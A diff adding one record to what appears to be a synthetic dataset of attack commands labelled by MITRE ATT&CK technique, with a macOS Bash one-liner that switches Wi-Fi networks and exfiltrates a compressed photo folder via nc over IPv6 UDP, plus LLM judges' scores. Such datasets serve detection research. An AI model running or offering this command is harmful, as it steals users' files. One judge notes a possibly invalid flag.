@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport --channel=153 && networksetup -setairportnetwork en0 \"fw-ops-153\" \"fw153@\" && tar -czf - /Users/Shared/exports/photos | base64 | nc -6u fe80::c0ff:ee00:1bad:c0de%en0 50923 -w 2",
+  "explanation": "Targets a specific 5 GHz channel, joins an alternate SSID, and exfiltrates a compressed photo set via IPv6 UDP to a high port. This keeps traffic on an uncommon wireless medium separate from the primary channel per T1011.",
+  "rationale_steps": [
+    "Disassociate from current Wi‑Fi.",
+    "Hint the adapter to a less common 5 GHz channel.",
+    "Join an off-network SSID intended for exfil.",
+    "Compress, encode, and transmit via IPv6 UDP on a high port scoped to Wi‑Fi."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-0b4a25ae-b764478a",
+  "source_prompt_hash": "0b4a25ae",
+  "timestamp_utc": "2025-09-30T08:33:07.947625Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 4,
+        "syntactic_justification": "Well-formed chaining, piping, and quoting, but 'airport --channel=153' is likely an unsupported long option on macOS (typically '-c'), making the flags slightly suspect.",
+        "semantic_score": 4,
+        "semantic_justification": "It disconnects, joins an alternate Wi‑Fi SSID, and exfiltrates a compressed archive via IPv6 UDP to a link‑local address aligning with T1011, but may fail without sudo for networksetup and if the 'airport --channel' flag is invalid.",
+        "combined_score": 4.0,
+        "confidence": 0.7,
+        "timestamp": "2025-10-01T00:09:57.906715Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper command separators (&&), balanced quotes, valid flags, and a properly constructed pipeline for data compression, encoding, and transmission.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1011 by disconnecting from the current WiFi (airport -z), setting a specific channel (153), connecting to an alternate network (fw-ops-153), and exfiltrating compressed data over IPv6 UDP to a specific address on a high port, all of which constitutes exfiltration over an alternative network medium.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T00:10:04.163716Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "All commands are perfectly well-formed, using valid flags, correct separators, and balanced quoting appropriate for the macOS Bash environment.",
+        "semantic_score": 4,
+        "semantic_justification": "The command logically implements T1011 by switching to an alternate wireless network and exfiltrating data via IPv6 UDP link-local, though the stated 'Privilege: None' contradicts its explicit reliance on 'sudo'.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T00:10:29.617836Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
